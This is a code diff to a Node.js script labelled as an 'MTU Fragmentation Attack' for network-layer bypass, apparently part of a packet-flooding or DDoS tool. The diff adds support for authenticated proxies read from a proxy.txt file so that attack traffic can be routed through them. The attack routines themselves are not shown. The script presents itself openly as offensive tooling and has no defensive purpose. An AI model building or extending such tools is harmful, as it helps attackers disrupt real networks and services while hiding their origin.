@@ -1,6 +1,7 @@
 // R10-6: PACKET-FRAGMENT - MTU Fragmentation Attack
 // Focus: Network layer bypass
 // Technique: Tiny packets + Fragmentation
+// Updated: Support authenticated proxies
 
 const dgram = require('dgram');
 const net = require('net');
@@ -12,12 +13,35 @@ const os = require('os');
 const CPU_CORES = os.cpus().length;
 let proxies = [];
 
+// Parse proxy line - supports both formats: host:port and host:port:username:password
+function parseProxy(proxyLine) {
+    const parts = proxyLine.split(':');
+    if (parts.length === 4) {
+        return {
+            host: parts[0],
+            port: parseInt(parts[1]),
+            username: parts[2],
+            password: parts[3],
+            auth: true
+        };
+    } else if (parts.length >= 2) {
+        return {
+            host: parts[0],
+            port: parseInt(parts[1]),
+            auth: false
+        };
+    }
+    return null;
+}
+
 // Load proxies
 try {
-    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
+    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
         .map(line => line.trim())
-        .filter(line => line && !line.startsWith('#') && line.includes(':'));
-    console.log(`[R10-6] Loaded ${proxies.length} proxies`);
+        .filter(line => line && !line.startsWith('#'));
+    
+    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
+    console.log(`[R10-6] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
 } catch (e) {
     console.log('[R10-6] No proxy.txt found, running without proxies');
 }
